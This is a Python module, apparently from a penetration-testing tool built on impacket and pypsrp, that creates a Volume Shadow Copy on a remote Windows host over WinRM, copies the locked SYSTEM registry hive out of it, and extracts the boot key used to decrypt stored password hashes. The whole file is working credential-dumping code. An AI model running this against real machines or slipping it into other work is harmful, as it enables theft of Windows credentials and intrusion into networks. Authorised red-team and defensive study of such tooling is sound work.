import time
from binascii import hexlify

from impacket.examples.secretsdump import LocalOperations
from pypsrp.wsman import SelectorSet

WMI_BASE = "http://schemas.microsoft.com/wbem/wsman/1/wmi"


class RemoteOperations:
    def __init__(self, connection, shadow_id=None):
        self.connection = connection
        self.wsman = connection.conn.wsman
        self.logger = connection.logger

        # Cached variables
        self.bootkey = None
        if shadow_id is not None:
            self.logger.display(f"Using existing VSS Snapshot ID: {shadow_id}")
        self._shadow_id = shadow_id
        self._shadow_copy_path = None

        # Keep track if we created a Shadow Copy to delete it later
        self.shadow_copy_created = False

    def delete_shadowcopy(self):
        selector = SelectorSet()
        selector.add_option("ID", self.shadow_id)
        self.logger.debug(f"Trying to delete ShadowCopy with ID {self.shadow_id}")
        self.wsman.delete(f"{WMI_BASE}/root/cimv2/Win32_ShadowCopy", selector_set=selector)
        self.logger.debug(f"ShadowCopy with ID {self.shadow_id} successfully deleted")
        self.shadow_copy_created = False

    def finish(self):
        """Delete the shadow copy we created, while the connection is still alive.

        Called explicitly at the end of the operations using this class:
        the destructor only runs after the protocol already disconnected,
        when it can no longer reach the service.
        """
        if self.shadow_copy_created:
            try:
                self.delete_shadowcopy()
            except Exception as e:
                self.logger.fail(f"Could not delete ShadowCopy ID {self.shadow_id}. You will need to delete this by yourself. ({e})")

    def __del__(self):
        self.finish()

    def create_shadowcopy(self):
        shadow_id = None
        try:
            self.logger.debug("Trying to create a VSS snapshot remotely via WSMan")
            result = self.connection.wmi_invoke(
                "root\\cimv2",
                "Win32_ShadowCopy",
                "Create",
                {"Context": "ClientAccessible", "Volume": "C:\\"},
            )
            if str(result.get("ReturnValue")) == "0":
                self.shadow_copy_created = True
                shadow_id = result.get("ShadowID")
                self.logger.debug(f"Shadow Copy created at ID {shadow_id}")
            else:
                self.logger.debug(f"Win32_ShadowCopy.Create returned {result.get('ReturnValue')}")
        except Exception as e:
            self.logger.debug(f"Cannot create ShadowCopy: {e}")
        return shadow_id

    def get_shadowcopy_path(self):
        device_object = None
        query = f'SELECT DeviceObject FROM Win32_ShadowCopy WHERE ID = "{self.shadow_id}"'
        for _ in range(3):
            records = self.connection.wql_enumerate(query, "root\\cimv2")
            if records:
                device_object = records[0].get("DeviceObject")
                break
            # the instance is queryable shortly after Create returns
            time.sleep(2)
        if device_object:
            self.logger.debug(f"Found ShadowCopy at {device_object}")
        return device_object

    @property
    def shadow_id(self):
        if self._shadow_id is None:
            self._shadow_id = self.create_shadowcopy()
        return self._shadow_id

    @property
    def shadow_copy_path(self):
        if self._shadow_copy_path is None:
            self._shadow_copy_path = self.get_shadowcopy_path()
        return self._shadow_copy_path

    def get_file(self, remote_path, download_path):
        """Fetch a remote file through the protocol PowerShell runspace.

        The registry hives are locked by the OS on the live filesystem, so the
        files are fetched from the shadow copy GLOBALROOT path instead.
        """
        self.logger.debug(f"Try fetching file {remote_path}")
        try:
            self.connection.conn.fetch(remote_path, download_path)
        except Exception as e:
            self.logger.debug(f"Cannot fetch {remote_path}: {e}")
            return False
        return True

    def get_bootkey(self, output_filename):
        if self.bootkey is not None:
            return self.bootkey

        # the SYSTEM hive is ~30MB going through WinRM at ~1MB/s
        self.logger.display("Fetching the SYSTEM hive for the bootkey, grab a coffee and be patient...")
        system_hive_path = f"{self.shadow_copy_path}\\Windows\\System32\\config\\SYSTEM"
        if not self.get_file(system_hive_path, f"{output_filename}.system"):
            self.logger.fail("Could not get the SYSTEM hive")
            return None
        self.logger.debug("Got SYSTEM hive")

        local_operations = LocalOperations(f"{output_filename}.system")
        self.bootkey = local_operations.getBootKey()
        self.logger.debug(f"Got bootkey: 0x{hexlify(self.bootkey).decode('utf-8')}")
        return self.bootkey
